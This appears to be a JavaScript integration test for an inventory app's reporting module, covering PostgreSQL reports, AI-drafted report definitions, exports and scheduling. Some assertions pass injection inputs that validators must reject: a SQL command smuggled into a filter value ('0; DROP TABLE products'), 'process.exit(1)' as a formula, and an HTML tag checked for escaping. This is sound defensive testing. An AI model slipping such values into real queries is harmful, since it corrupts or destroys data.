'use strict';

const test=require('node:test');
const assert=require('node:assert/strict');
const request=require('supertest');
const {startCluster}=require('../helpers/postgres-cluster');
const {openPostgres}=require('../../src/db/postgres');
const {migratePostgres}=require('../../src/db/migrate-postgres');
const {createPostgresApp}=require('../../src/postgres-app');
const catalog=require('../../src/domain/postgres-catalog-service');
const locations=require('../../src/domain/postgres-location-service');
const inventory=require('../../src/domain/postgres-inventory-engine');
const commerce=require('../../src/operations/postgres-commerce');
const workflows=require('../../src/operations/postgres-business-workflows');
const ledger=require('../../src/accounting/postgres-ledger');
const reports=require('../../src/reports/postgres-service');
const reportAsk=require('../../src/reports/postgres-ask');
const reportRegistry=require('../../src/reports/postgres-registry');
const scheduling=require('../../src/reports/postgres-scheduling');
const reportExports=require('../../src/reports/exports');
const jobs=require('../../src/operations/postgres-job-queue');
const runtimeHandlers=require('../../src/operations/postgres-runtime-handlers');
const {readWorkbook}=require('../../src/imports/xlsx-reader');
const {pricedUsage,PRICED_MODEL}=require('../helpers/postgres-model-fixture');

function csrf(html){return /name="_csrf" value="([^"]+)"/.exec(html)?.[1];}
function binary(response,callback){const chunks=[];response.on('data',(chunk)=>chunks.push(chunk));
  response.on('end',()=>callback(null,Buffer.concat(chunks)));}
async function register(agent,name,email){
  const page=await agent.get('/register');
  await agent.post('/register').type('form').send({_csrf:csrf(page.text),name,
    businessName:`${name} Business`,email,password:'report-test-password'});
}

test('governed reports query real PostgreSQL, save, export, schedule and isolate tenants',
  {timeout:120000},async(context)=>{
    const cluster=await startCluster();
    const database=openPostgres(cluster.connectionString,{applicationName:'stockchief-report-test'});
    await migratePostgres(database);
    const modelCalls=[];let reportPlanCalls=0;
    const provider={name:'anthropic',model:PRICED_MODEL,async complete(input){
      modelCalls.push(input.schemaName);
      if(input.schemaName==='stockchief_capability_plan'){
        const message=JSON.parse(input.prompt).message;
        const saving=/save|schedule/i.test(message);
        const step=(capability)=>({capability,arguments:[],dependsOn:[],continuesPending:false});
        if(/compare stock across our locations/i.test(message)){
          reportPlanCalls++;
          return {data:{steps:input.schema.properties.steps.items.properties.capability.enum
            .includes('read.inventory_positions')
            ?[step('read.inventory_positions'),step('read.custom_report')]
            :[step('read.custom_report')],clarifyingQuestion:''},usage:pricedUsage()};
        }
        if(/bar chart report/i.test(message)&&++reportPlanCalls===1)
          return {data:{steps:[step('read.inventory_positions')],clarifyingQuestion:''},usage:pricedUsage()};
        return {data:{steps:saving?[step('report.template.create')]:
          [step('read.custom_report')],clarifyingQuestion:''},
        usage:pricedUsage()};
      }
      if(input.schemaName==='stockchief_capability_fit')return {data:{aligned:true,reason:''},usage:pricedUsage()};
      if(input.schemaName==='stockchief_governed_report_fit')return {data:{aligned:true,reason:''},usage:pricedUsage()};
      if(input.schemaName==='stockchief_governed_report'&&
        /monthly line-chart report/i.test(JSON.parse(input.prompt).request))
        return {data:{dataset:'movements',title:'Monthly inventory movement',dateGrain:'month',
          columns:[],groups:['occurred_on'],aggregate:'sum',measure:'quantity_delta',filters:[],
          sort:'occurred_on',direction:'asc',chart:'line'},usage:pricedUsage()};
      if(input.schemaName==='stockchief_governed_report'&&
        /more than two ordered units/i.test(JSON.parse(input.prompt).request)){
        const previous=JSON.parse(input.prompt).previousReport;
        assert.equal(previous?.dataset,'composed');
        return {data:{...previous,title:'Filtered recorded profit per ordered unit',
          columns:[],groups:['sku'],aggregate:'sum',measure:'',filters:[],
          sort:'calculated',direction:'desc',resultFilters:[
            {field:'ordered',operator:'greater_than',value:'2'}]},usage:pricedUsage()};
      }
      if(input.schemaName==='stockchief_governed_report'&&
        /combine posted gross profit and ordered units/i.test(JSON.parse(input.prompt).request))
        return {data:{...combinedDefinition,columns:[],groups:['sku'],aggregate:'sum',measure:'',
          filters:[],direction:'desc'},usage:pricedUsage()};
      if(input.schemaName==='stockchief_governed_report')return {data:{dataset:'stock',title:'Units by location',
        columns:[],groups:['location'],aggregate:'sum',measure:'on_hand',filters:[],sort:'total',
        direction:'desc',chart:'bar'},usage:pricedUsage()};
      if(input.schemaName==='stockchief_governed_report_save')return {data:{report:{dataset:'stock',
        title:'Morning units by location',columns:[],groups:['location'],aggregate:'sum',
        measure:'on_hand',filters:[],sort:'total',direction:'desc',chart:'bar'},
      frequency:'weekly',hourUtc:9},usage:pricedUsage()};
      if(input.schemaName==='stockchief_governed_report_followup_save')return {data:{
        title:'Weekly stock by location',frequency:'weekly',hourUtc:9},usage:pricedUsage()};
      throw new Error(`Unexpected report model request ${input.schemaName}`);
    }};
    const app=createPostgresApp({database,env:'test',sessionSecret:'report-test-secret',aiProvider:provider});
    context.after(async()=>{await app.locals.sessionStore.close();await database.close();cluster.stop();});
    const owner=request.agent(app);await register(owner,'Report Owner','report-owner@example.test');
    const ctx=(await database.query(`SELECT w.id AS "workspaceId",u.id AS "actorId" FROM workspaces w
      JOIN users u ON u.workspace_id=w.id WHERE w.name='Report Owner Business'`)).rows[0];
    const location=await locations.createLocation(database,ctx,{name:'Main',kind:'warehouse'});
    const product=await catalog.createItem(database,ctx,{name:'Copper Clamp',baseCode:'CLAMP',trackingMode:'quantity'});
    await inventory.receive(database,ctx,{skuId:product.skuIds[0],locationId:location.id,quantity:12,
      idempotencyKey:'report-fixture-receive',reference:'RPT-1'});
    const buyer=await commerce.createCustomer(database,ctx,{name:'Report Buyer',email:'report-buyer@example.test'});
    const supplier=await commerce.createSupplier(database,ctx,{name:'Report Supplier',
      email:'report-supplier@example.test',defaultLeadTimeDays:7});
    const lineOrder=await workflows.createSalesOrder(database,ctx,{customerId:buyer.id,
      deliveryMethod:'PICKUP',lines:[{skuId:product.skuIds[0],quantity:3,unitPriceMinor:250}],
      idempotencyKey:'report-fixture-order'});
    const actor=(await database.query(`SELECT u.role,u.permissions,a.email FROM users u JOIN accounts a ON a.id=u.account_id
      WHERE u.workspace_id=$1 AND u.id=$2`,[ctx.workspaceId,ctx.actorId])).rows[0];
    await ledger.configure(database,ctx,{startDate:'2026-01-01',currency:'USD'});
    for(const [key,date,revenue,cost] of [['first','2026-10-01',1000,400],
      ['second','2026-10-02',500,350]]){
      await ledger.post(database,ctx,{postingDate:date,sourceKey:`report-posted-sale-${key}`,
        sourceType:'sale_fulfillment',sourceRecordType:'sales_order',sourceRecordId:lineOrder.salesOrderId,
        description:`Recorded sale ${key}`,currency:'USD',lines:[
          {accountKey:'ACCOUNTS_RECEIVABLE',debitMinor:revenue,customerId:buyer.id,
            itemId:product.itemId,skuId:product.skuIds[0]},
          {accountKey:'SALES_REVENUE',creditMinor:revenue,customerId:buyer.id,
            itemId:product.itemId,skuId:product.skuIds[0]},
          {accountKey:'COST_OF_GOODS_SOLD',debitMinor:cost,customerId:buyer.id,
            itemId:product.itemId,skuId:product.skuIds[0]},
          {accountKey:'INVENTORY_ASSET',creditMinor:cost,customerId:buyer.id,
            itemId:product.itemId,skuId:product.skuIds[0]}]});
    }
    await ledger.post(database,ctx,{postingDate:'2026-10-03',sourceKey:'report-posted-refund',
      sourceType:'sales_refund',sourceRecordType:'customer_return',description:'Recorded return',currency:'USD',lines:[
        {accountKey:'SALES_RETURNS',debitMinor:200,customerId:buyer.id,
          itemId:product.itemId,skuId:product.skuIds[0]},
        {accountKey:'ACCOUNTS_RECEIVABLE',creditMinor:200,customerId:buyer.id,
          itemId:product.itemId,skuId:product.skuIds[0]},
        {accountKey:'INVENTORY_ASSET',debitMinor:80,customerId:buyer.id,
          itemId:product.itemId,skuId:product.skuIds[0]},
        {accountKey:'COST_OF_GOODS_SOLD',creditMinor:80,customerId:buyer.id,
          itemId:product.itemId,skuId:product.skuIds[0]}]});
    const postedMargin=await reports.run(database,ctx,actor,{dataset:'posted_sales_activity',
      groups:['sku'],aggregate:'ratio',measure:'gross_margin_percent',
      filters:[{field:'currency',operator:'equals',value:'USD'}],sort:'ratio',chart:'bar'});
    assert.equal(postedMargin.rows.length,1);
    assert.equal(postedMargin.rows[0].sku,'CLAMP');
    assert.equal(Number(postedMargin.rows[0].ratio),48.46);
    assert.equal(postedMargin.displayRows[0].ratio,'48.46%');
    assert.equal(postedMargin.columnLabels.ratio,'Gross margin %');
    assert.match(reportExports.csv(postedMargin).toString(),/"Gross margin %"/);
    const askMargin=await reportAsk.prepare(database,ctx,
      'Show the posted gross margin percentage by SKU for October in USD',{provider:{
        async complete(input){
          if(input.schemaName==='stockchief_governed_report_fit')
            return {data:{aligned:true,reason:''}};
          return {data:{dataset:'posted_sales_activity',title:'Posted margin by SKU',columns:[],
            groups:['sku'],aggregate:'ratio',measure:'gross_margin_percent',
            filters:[{field:'currency',operator:'equals',value:'USD'},
              {field:'posting_date',operator:'at_least',value:'2026-10-01'},
              {field:'posting_date',operator:'at_most',value:'2026-10-31'}],
            sort:'ratio',direction:'desc',chart:'bar'}};
        }}});
    assert.equal(askMargin.status,'ANSWERED');
    assert.equal(askMargin.rows[0].ratio,'48.46%');
    let fitChecks=0;
    const sourceDrilldown=await reportAsk.prepare(database,ctx,
      'Chart posted gross margin by SKU in USD and let me inspect source records',{provider:{
        async complete(input){
          if(input.schemaName==='stockchief_governed_report_fit'){
            fitChecks++;
            return {data:fitChecks===1?{aligned:false,reason:'Source records are not in the chart table'}:
              {aligned:true,reason:'Each group offers source-record drilldown'}};
          }
          return {data:{dataset:'posted_sales_activity',title:'Posted margin by SKU',columns:[],
            groups:['sku'],aggregate:'ratio',measure:'gross_margin_percent',
            filters:[{field:'currency',operator:'equals',value:'USD'}],
            sort:'ratio',direction:'desc',chart:'bar'}};
        }}});
    assert.equal(fitChecks,2);
    assert.equal(sourceDrilldown.status,'ANSWERED');
    assert.equal(sourceDrilldown.rows[0].ratio,'48.46%');
    const postedSummary=await reports.run(database,ctx,actor,{dataset:'posted_sales_activity',summary:true,
      columns:[],aggregate:'sum',measure:'gross_profit_minor',
      filters:[{field:'currency',operator:'equals',value:'USD'}],chart:'table'});
    assert.equal(Number(postedSummary.rows[0].total),630);
    assert.equal(postedSummary.displayRows[0].total,'$6.30');
    const journalDebits=await reports.run(database,ctx,actor,{dataset:'journal_lines',
      groups:['currency'],aggregate:'sum',measure:'debit_minor',sort:'currency',chart:'table'});
    assert.equal(journalDebits.rows.length,1);
    assert.equal(journalDebits.rows[0].currency,'USD');
    assert.equal(Number(journalDebits.rows[0].total),2530);
    assert.equal(journalDebits.displayRows[0].total,'$25.30');
    const combinedDefinition={dataset:'composed',title:'Recorded profit per ordered unit',
      dimension:'sku',metrics:[
        {alias:'ordered',dataset:'sales_order_lines',aggregate:'sum',measure:'ordered_units',filters:[]},
        {alias:'profit',dataset:'posted_sales_activity',aggregate:'sum',measure:'gross_profit_minor',
          filters:[{field:'currency',operator:'equals',value:'USD'}]}],
      formula:'profit / ordered',formulaLabel:'Gross profit per ordered unit',
      formulaUnit:'money',chart:'bar',chartMeasure:'calculated',sort:'sku',layout:'dashboard'};
    const combined=await reports.run(database,ctx,actor,combinedDefinition);
    assert.equal(combined.rows.length,1);
    assert.equal(combined.rows[0].sku,'CLAMP');
    assert.equal(Number(combined.rows[0].ordered),3);
    assert.equal(Number(combined.rows[0].profit),630);
    assert.equal(Number(combined.rows[0].calculated),210);
    assert.equal(combined.displayRows[0].calculated,'$2.10');
    assert.equal(combined.chartColumn,'calculated');
    assert.equal(combined.config.layout,'dashboard');
    assert.equal(await reports.countAtMost(database,ctx,actor,combinedDefinition,10),1);
    const qualifying=await reports.run(database,ctx,actor,{...combinedDefinition,sort:'calculated',
      resultFilters:[{field:'ordered',operator:'greater_than',value:'2'}]});
    assert.equal(qualifying.rows.length,1);
    assert.equal(qualifying.config.sort,'calculated');
    const excluded={...combinedDefinition,resultFilters:[
      {field:'ordered',operator:'greater_than',value:'3'}]};
    assert.equal((await reports.run(database,ctx,actor,excluded)).rows.length,0);
    assert.equal(await reports.countAtMost(database,ctx,actor,excluded,10),0);
    let composedEditCalls=0;
    const editProvider={async complete(input){
      const data=JSON.parse(input.prompt);
      if(input.schemaName==='stockchief_governed_report')return {data:{...combinedDefinition,
        chart:'table',sort:'sku',resultFilters:[]}};
      if(input.schemaName==='stockchief_governed_report_fit')return {data:{
        aligned:data.definition.chart==='bar'&&data.definition.sort==='calculated'
          &&data.definition.resultFilters?.some((filter)=>filter.field==='ordered'
            &&filter.operator==='greater_than'&&filter.value==='2'),
        reason:'The requested measure sort and post-aggregation filter are missing.'}};
      if(input.schemaName==='stockchief_governed_report_composed_edit'){
        composedEditCalls++;
        assert.deepEqual(data.allowedResultFields,['ordered','profit','calculated']);
        return {data:{chart:'bar',sort:'calculated',direction:'desc',resultFilters:[
          {field:'ordered',operator:'greater_than',value:'2'}]}};
      }
      throw new Error(`Unexpected model request ${input.schemaName}`);
    }};
    const repairedFollowup=await reportAsk.prepare(database,ctx,
      'Make that same report a bar chart, sort by calculated total high to low, and show only groups with more than two ordered units.',
      {provider:editProvider,priorReport:combinedDefinition});
    assert.equal(repairedFollowup.status,'ANSWERED');
    assert.equal(repairedFollowup.reportConfig.sort,'calculated');
    assert.deepEqual(repairedFollowup.reportConfig.resultFilters,[
      {field:'ordered',operator:'greater_than',value:'2'}]);
    assert.equal(composedEditCalls,1);
    assert.throws(()=>reports.normalize({...combinedDefinition,resultFilters:[
      {field:'sku',operator:'greater_than',value:'0'}]},actor),/selected measure/i);
    assert.throws(()=>reports.normalize({...combinedDefinition,resultFilters:[
      {field:'ordered',operator:'greater_than',value:'0; DROP TABLE products'}]},actor),/numeric result/i);
    const byOrder=await reports.run(database,ctx,actor,{dataset:'composed',
      title:'Recorded order line units',dimension:'order_number',metrics:[
        {alias:'orders',dataset:'sales_orders',aggregate:'count',measure:'quoted_line_total_minor',filters:[]},
        {alias:'units',dataset:'sales_order_lines',aggregate:'sum',measure:'ordered_units',filters:[]}],
      formula:'units / orders',formulaLabel:'Units per order',chart:'table',sort:'order_number'});
    assert.equal(byOrder.rows.length,1);
    assert.equal(Number(byOrder.rows[0].orders),1);
    assert.equal(Number(byOrder.rows[0].units),3);
    assert.equal(Number(byOrder.rows[0].calculated),3);
    assert.doesNotThrow(()=>reports.normalize({dataset:'composed',dimension:'shipment_number',metrics:[
      {alias:'quotes',dataset:'shipment_rates',aggregate:'sum',measure:'delivery_days',filters:[]},
      {alias:'shipments',dataset:'shipments',aggregate:'count',measure:'',filters:[]}],
    },actor));
    const combinedSource=await reports.run(database,ctx,actor,
      reports.drilldownSpec(combinedDefinition,['CLAMP'],actor,'profit'));
    assert.equal(combinedSource.rows.length,3);
    assert.ok(combinedSource.rows.every((row)=>row.href.startsWith('/accounting/entries/')));
    assert.throws(()=>reports.normalize({...combinedDefinition,formula:'process.exit(1)'},actor),
      /metric names|calculation/i);
    assert.throws(()=>reports.normalize({...combinedDefinition,
      metrics:[...combinedDefinition.metrics,{alias:'book_cost',dataset:'inventory_valuation',
        aggregate:'sum',measure:'book_cost_minor',
        filters:[{field:'currency',operator:'equals',value:'EUR'}]}]},actor),
    /same currency|exact currency/i);
    assert.throws(()=>reports.normalize({dataset:'composed',dimension:'order_number',metrics:[
      {alias:'quoted',dataset:'sales_orders',aggregate:'sum',measure:'quoted_line_total_minor',
        filters:[{field:'currency',operator:'equals',value:'USD'}]},
      {alias:'units',dataset:'sales_order_lines',aggregate:'sum',measure:'ordered_units',filters:[]}],
    },actor),/pricing complete/i);
    const composedPage=await owner.get('/reports/compose?dimension=sku');
    assert.equal(composedPage.status,200);
    assert.match(composedPage.text,/Combine governed datasets/);
    const combinedPreview=await owner.post('/reports/run').type('form').send({
      _csrf:csrf(composedPage.text),dataset:'composed',title:combinedDefinition.title,
      dimension:'sku',
      'metrics[0][dataset]':'sales_order_lines','metrics[0][alias]':'ordered',
      'metrics[0][aggregate]':'sum','metrics[0][measure]':'ordered_units',
      'metrics[1][dataset]':'posted_sales_activity','metrics[1][alias]':'profit',
      'metrics[1][aggregate]':'sum','metrics[1][measure]':'gross_profit_minor',
      'metrics[1][filters][0][field]':'currency',
      'metrics[1][filters][0][operator]':'equals','metrics[1][filters][0][value]':'USD',
      formula:combinedDefinition.formula,
      formulaLabel:combinedDefinition.formulaLabel,formulaUnit:'money',chart:'bar',
      chartMeasure:'calculated',sort:'calculated',layout:'dashboard',
      'resultFilters[0][field]':'ordered','resultFilters[0][operator]':'greater_than',
      'resultFilters[0][value]':'2'});
    if(combinedPreview.status!==200){const redirected=await owner.get(combinedPreview.headers.location||'/reports');
      assert.equal(combinedPreview.status,200,redirected.text.match(/flash--error[^]*?<\/span>/)?.[0]||redirected.text.slice(0,400));}
    assert.match(combinedPreview.text,/Gross profit per ordered unit/);
    assert.match(combinedPreview.text,/See Posted sales revenue and product cost records/);
    assert.match(combinedPreview.text,/report-layout--dashboard/);
    const sourcePost=await owner.post('/reports/drilldown').type('form').send({
      _csrf:csrf(combinedPreview.text),definition:JSON.stringify(combined.config),
      groupValues:JSON.stringify(['CLAMP']),sourceAlias:'profit'});
    assert.equal(sourcePost.status,303);
    const sourcePage=await owner.get(sourcePost.headers.location);
    assert.equal(sourcePage.status,200);
    assert.match(sourcePage.text,/CLAMP/);
    assert.match(sourcePage.text,/Open record/);
    assert.match(sourcePage.text,/Back to Report/);
    const combinedSave=await owner.post('/reports/save').type('form').send({
      _csrf:csrf(combinedPreview.text),definition:JSON.stringify(qualifying.config),
      frequency:'weekly',hour:'14'});
    assert.equal(combinedSave.status,303);
    const combinedId=combinedSave.headers.location.split('/').at(-1);
    const combinedStored=await reports.load(database,ctx,actor,combinedId);
    assert.equal(combinedStored.definition.formula,'profit / ordered');
    assert.equal(combinedStored.definition.layout,'dashboard');
    assert.deepEqual(combinedStored.definition.resultFilters,[
      {field:'ordered',operator:'greater_than',value:'2'}]);
    assert.equal(combinedStored.schedule_frequency,'weekly');
    const changedJoinKey=await owner.get(`/reports/compose?dimension=order_number&saved=${combinedId}`);
    assert.equal(changedJoinKey.status,200);
    assert.match(changedJoinKey.text,/value="order_number" selected/);
    assert.doesNotMatch(changedJoinKey.text,/value="profit \/ ordered"/);
    const combinedCsv=await owner.get(`/reports/saved/${combinedId}/export.csv`);
    assert.equal(combinedCsv.status,200);
    assert.match(combinedCsv.text,/Gross profit per ordered unit/);
    assert.match(combinedCsv.text,/\$2\.10/);
    const combinedXlsx=await owner.get(`/reports/saved/${combinedId}/export.xlsx`).buffer(true).parse(binary);
    assert.equal(combinedXlsx.status,200);
    assert.equal(combinedXlsx.body.subarray(0,2).toString(),'PK');
    const combinedPdf=await owner.get(`/reports/saved/${combinedId}/export.pdf`).buffer(true).parse(binary);
    assert.equal(combinedPdf.status,200);
    assert.equal(combinedPdf.body.subarray(0,4).toString(),'%PDF');
    const combinedAskPage=await owner.get('/ask');
    const combinedAsk=await owner.post('/ask').type('form').send({
      _csrf:csrf(combinedAskPage.text),
      message:'Combine posted gross profit and ordered units by SKU; calculate profit per ordered unit as a bar chart'});
    assert.equal(combinedAsk.status,303);
    const combinedAskResult=await owner.get('/ask');
    assert.match(combinedAskResult.text,/Recorded profit per ordered unit/);
    assert.match(combinedAskResult.text,/\$2\.10/);
    const followupResponse=await owner.post('/ask').type('form').send({_csrf:csrf(combinedAskResult.text),
      message:'Now show only groups with more than two ordered units and sort by calculated value, high to low.'});
    assert.equal(followupResponse.status,303);
    const followupResult=await owner.get('/ask');
    assert.match(followupResult.text,/Filtered recorded profit per ordered unit/);
    assert.match(followupResult.text,/\$2\.10/);
    const combinedInteraction=(await database.query(`SELECT id FROM stockchief_runtime.assistant_interactions
      WHERE workspace_id=$1 AND actor_user_id=$2 AND intent->'reportConfig'->>'dataset'='composed'
      ORDER BY created_at DESC,id DESC LIMIT 1`,[ctx.workspaceId,ctx.actorId])).rows[0];
    assert.ok(combinedInteraction?.id);
    const combinedAskFull=await owner.get(`/reports/from-ask/${combinedInteraction.id}/run`);
    assert.equal(combinedAskFull.status,200);
    assert.match(combinedAskFull.text,/See Posted sales revenue and product cost records/);
    const combinedAskBuilder=await owner.get(`/reports/from-ask/${combinedInteraction.id}`);
    assert.equal(combinedAskBuilder.status,200);
    assert.match(combinedAskBuilder.text,/Customize Ask report/);
    const postedSources=await reports.run(database,ctx,actor,
      reports.drilldownSpec(postedSummary.config,[],actor));
    assert.equal(postedSources.rows.length,3);
    assert.ok(postedSources.rows.every((row)=>row.href.startsWith('/accounting/entries/')));
    assert.throws(()=>reports.normalize({dataset:'posted_sales_activity',summary:true,
      aggregate:'ratio',measure:'gross_margin_percent'},actor),/one exact currency/i);
    for(const entry of reportRegistry.list(actor)){
      const detail=await reports.run(database,ctx,actor,{dataset:entry.key,
        columns:[Object.keys(entry.fields)[0]],sort:Object.keys(entry.fields)[0]});
      assert.equal(detail.provenance.dataset,entry.key);
    }
    const stock=await reports.run(database,ctx,actor,{dataset:'stock',columns:['product','sku','location','on_hand'],
      sort:'product',direction:'asc'});
    assert.equal(stock.rows.length,1);assert.equal(Number(stock.rows[0].on_hand),12);
    assert.equal(stock.rows[0].href,`/inventory/${product.itemId}`);
    assert.equal((await owner.get(stock.rows[0].href)).status,200);
    const productCatalogue=await reports.run(database,ctx,actor,{dataset:'catalogue',
      columns:['product','sku','status','tracking'],sort:'sku'});
    assert.equal(productCatalogue.rows.length,1);
    assert.equal(productCatalogue.rows[0].sku,'CLAMP');
    assert.equal(productCatalogue.rows[0].href,`/inventory/${product.itemId}`);
    const customerDirectory=await reports.run(database,ctx,actor,{dataset:'customers',
      columns:['customer','email','record_state'],sort:'customer'});
    assert.equal(customerDirectory.rows[0].customer,'Report Buyer');
    assert.equal(customerDirectory.rows[0].href,`/sales/customers/${buyer.id}`);
    assert.equal((await owner.get(customerDirectory.rows[0].href)).status,200);
    const supplierDirectory=await reports.run(database,ctx,actor,{dataset:'suppliers',
      columns:['supplier','email','lead_time_days'],sort:'supplier'});
    assert.equal(supplierDirectory.rows[0].supplier,'Report Supplier');
    assert.equal(Number(supplierDirectory.rows[0].lead_time_days),7);
    assert.equal(supplierDirectory.rows[0].href,`/suppliers/${supplier.id}`);
    assert.equal((await owner.get(supplierDirectory.rows[0].href)).status,200);
    const literalContains=await reports.run(database,ctx,actor,{dataset:'catalogue',
      columns:['sku'],filters:[{field:'sku',operator:'contains',value:'CL%'}],sort:'sku'});
    assert.equal(literalContains.rows.length,0,'a percent sign in a text filter is not a wildcard');
    const partialContains=await reports.run(database,ctx,actor,{dataset:'catalogue',
      columns:['sku'],filters:[{field:'sku',operator:'contains',value:'CLA'}],sort:'sku'});
    assert.equal(partialContains.rows.length,1);
    const productOrders=await reports.run(database,ctx,actor,{dataset:'sales_order_lines',
      columns:['order_number','customer','sku','ordered_units','open_units'],sort:'order_number'});
    assert.equal(productOrders.rows.length,1);
    assert.equal(productOrders.rows[0].customer,'Report Buyer');
    assert.equal(Number(productOrders.rows[0].ordered_units),3);
    assert.equal(productOrders.rows[0].href,`/orders/${lineOrder.salesOrderId}`);
    const hiddenSort=await reports.run(database,ctx,actor,{dataset:'sales_order_lines',
      columns:['order_number','customer','ordered_units','fulfilled_units','open_units'],
      filters:[{field:'sku',operator:'equals',value:'CLAMP'}],sort:'order_date',direction:'desc'});
    assert.equal(hiddenSort.rows.length,1);
    assert.equal(hiddenSort.rows[0].order_date,undefined);
    const measuredSort=reportAsk.normalizeProposal({dataset:'sales_order_lines',groups:['sku'],
      aggregate:'sum',measure:'open_units',sort:'open_units',direction:'desc',chart:'bar'},actor);
    assert.equal(measuredSort.sort,'total');
    assert.equal(Number((await reports.run(database,ctx,actor,measuredSort)).rows[0].total),3);
    assert.throws(()=>reports.normalize({dataset:'sales_orders',groups:['customer'],
      aggregate:'sum',measure:'quoted_line_total_minor',filters:[{field:'currency',operator:'equals',value:'USD'}],
      sort:'total'},actor),/pricing complete/i);
    const quoted=await reports.run(database,ctx,actor,{dataset:'sales_orders',groups:['customer'],
      aggregate:'sum',measure:'quoted_line_total_minor',filters:[
        {field:'currency',operator:'equals',value:'USD'},
        {field:'pricing_complete',operator:'equals',value:'yes'}],sort:'total'});
    assert.equal(Number(quoted.rows[0].total),750);
    assert.equal(quoted.displayRows[0].total,'$7.50');
    const quotedCsv=reportExports.csv(quoted).toString();
    assert.match(quotedCsv,/"\$7\.50"/);
    assert.doesNotMatch(quotedCsv,/"750"/);
    const quotedWorkbook=readWorkbook(reportExports.xlsx(quoted));
    assert.equal(quotedWorkbook.sheets[0].rows[1][1],'$7.50');
    const moneyChart=await reportAsk.prepare(database,ctx,
      'Make a bar chart of fully priced quoted order value by customer in USD',{provider:{
        async complete(input){if(input.schemaName==='stockchief_governed_report_fit')
          return {data:{aligned:true,reason:''}};
          return {data:{dataset:'sales_orders',title:'Quoted value by customer',columns:[],
            groups:['customer'],aggregate:'sum',measure:'quoted_line_total_minor',filters:[
              {field:'currency',operator:'equals',value:'USD'},
              {field:'pricing_complete',operator:'equals',value:'yes'}],
            sort:'total',direction:'desc',chart:'bar'}};
        }}});
    assert.equal(moneyChart.status,'ANSWERED');
    assert.equal(moneyChart.rows[0].total,'$7.50');
    assert.deepEqual(moneyChart.chartAmounts,[750]);
    const savedChart=await reportAsk.composeForSave(database,ctx,
      'Save that exact value-by-customer bar chart and schedule it Mondays at 09:00 UTC',{
        priorReport:moneyChart.reportConfig,provider:{async complete(input){
          assert.equal(input.schemaName,'stockchief_governed_report_followup_save');
          return {data:{title:'Weekly quoted value',frequency:'weekly',hourUtc:9}};
        }}});
    assert.deepEqual(savedChart.definition,{...moneyChart.reportConfig,title:'Weekly quoted value'});
    assert.equal(savedChart.schedule.frequency,'weekly');
    assert.equal(savedChart.schedule.hour,9);
    await database.query(`UPDATE sales_order_lines SET unit_price_minor=NULL
      WHERE workspace_id=$1 AND sales_order_id=$2`,[ctx.workspaceId,lineOrder.salesOrderId]);
    const unpriced=await reports.run(database,ctx,actor,{dataset:'sales_orders',
      columns:['order_number','pricing_complete','quoted_line_total_minor','currency'],sort:'order_number'});
    assert.equal(unpriced.rows[0].pricing_complete,'no');
    assert.equal(unpriced.rows[0].quoted_line_total_minor,null);
    assert.equal(unpriced.displayRows[0].quoted_line_total_minor,null);
    const grouped=await reports.run(database,ctx,actor,{dataset:'stock',groups:['location'],aggregate:'sum',
      measure:'on_hand',sort:'total',direction:'desc',chart:'bar'});
    assert.equal(Number(grouped.rows[0].total),12);
    assert.deepEqual(grouped.columns,['location','total']);
    assert.equal(grouped.insights.length,0);
    const extremes=await reports.run(database,ctx,actor,{dataset:'stock',groups:['location'],
      aggregate:'maximum',measure:'on_hand',sort:'maximum',direction:'desc',chart:'bar'});
    assert.equal(Number(extremes.rows[0].maximum),12);
    const detailSpec=reports.drilldownSpec(grouped.config,['Main'],actor);
    const detail=await reports.run(database,ctx,actor,detailSpec);
    assert.equal(detail.rows.length,1);
    assert.equal(detail.rows[0].product,'Copper Clamp');
    assert.equal(detail.rows[0].href,`/inventory/${product.itemId}`);
    const monthly=await reports.run(database,ctx,actor,{dataset:'movements',groups:['occurred_on'],
      dateGrain:'month',aggregate:'sum',measure:'quantity_delta',sort:'occurred_on',
      direction:'asc',chart:'line'});
    assert.equal(Number(monthly.rows[0].total),12);
    assert.match(monthly.rows[0].occurred_on,/^\d{4}-\d{2}-01$/);
    const monthDetail=await reports.run(database,ctx,actor,
      reports.drilldownSpec(monthly.config,[monthly.rows[0].occurred_on],actor));
    assert.equal(monthDetail.rows.length,1);
    assert.equal(monthDetail.rows[0].sku,'CLAMP');
    const genericInsight=require('../../src/reports/postgres-insights').observations({
      config:{chart:'line',groups:['occurred_on']},columns:['occurred_on','total'],
      rows:[{occurred_on:'2026-08-01',total:4},{occurred_on:'2026-09-01',total:7}],
      displayRows:[{total:4},{total:7}],hasMore:false});
    assert.match(genericInsight[0].text,/rose from 4 to 7/);
    const intervalInsight=require('../../src/reports/postgres-insights').observations({
      config:{chart:'line',groups:['occurred_on']},columns:['occurred_on','total'],
      rows:[{occurred_on:'2026-07-01',total:10},{occurred_on:'2026-08-01',total:4},
        {occurred_on:'2026-09-01',total:7}],
      displayRows:[{total:10},{total:4},{total:7}],hasMore:false});
    assert.match(intervalInsight[1].text,/decreased from 10 to 4/);
    const negativeInsight=require('../../src/reports/postgres-insights').observations({
      config:{chart:'bar',groups:['sku']},columns:['sku','total'],
      rows:[{sku:'A',total:-4},{sku:'B',total:7}],
      displayRows:[{total:-4},{total:7}],hasMore:false});
    assert.match(negativeInsight.at(-1).text,/1 displayed group has a total below zero/);
    const digest=scheduling.deliveryMessage({id:'report-safe',delivery_email:'owner@example.test'},
      {config:{title:'Stock trend'},asOf:'2026-10-09T00:00:00Z',columns:['occurred_on','total'],
        rows:[{occurred_on:'2026-08-01',total:4},{occurred_on:'2026-09-01',total:7}],
        displayRows:[{occurred_on:'2026-08-01',total:4},{occurred_on:'2026-09-01',total:7}],
        insights:[...genericInsight,{text:'<untrusted>'}],hasMore:false},'https://stockchief.example');
    assert.match(digest.message.html,/rose from 4 to 7/);
    assert.match(digest.message.html,/&lt;untrusted&gt;/);
    assert.match(digest.message.text,/rose from 4 to 7/);
    assert.deepEqual(require('../../src/reports/postgres-insights').observations({
      config:{chart:'bar',groups:['currency']},columns:['currency','total'],
      rows:[{currency:'USD',total:100},{currency:'JPY',total:100}],
      displayRows:[{total:'$1.00'},{total:'¥100'}],comparisonSafe:false}),[]);
    const moneyGroups={groups:['currency'],aggregate:'sum',measure:'amount_minor'};
    const moneyDataset={fields:{amount_minor:'money_minor'}};
    assert.equal(reports.comparableGroupAmounts(moneyGroups,moneyDataset,[{currency:'USD'}],false,null),true);
    assert.equal(reports.comparableGroupAmounts(moneyGroups,moneyDataset,
      [{currency:'USD'},{currency:'JPY'}],false,null),false);
    assert.equal(reports.comparableGroupAmounts(moneyGroups,moneyDataset,[{currency:'USD'}],true,null),false);
